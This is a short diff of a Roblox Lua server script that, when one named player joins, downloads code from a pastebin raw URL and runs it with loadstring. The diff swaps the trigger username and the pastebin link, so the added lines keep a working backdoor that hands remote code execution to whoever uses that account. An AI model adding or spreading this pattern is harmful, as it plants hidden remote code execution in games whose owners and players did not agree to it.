@@ -1,8 +1,8 @@
 local Players = game:GetService("Players")
 
 Players.PlayerAdded:Connect(function(player)
-  if player.Name == "1kS_up" then
-			loadstring(game:HttpGet("https://pastebin.com/raw/J6S9h1rn"))()
+  if player.Name == "ProAIt5000" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/CBZ1CZ9s"))()
 		end
 end)
 
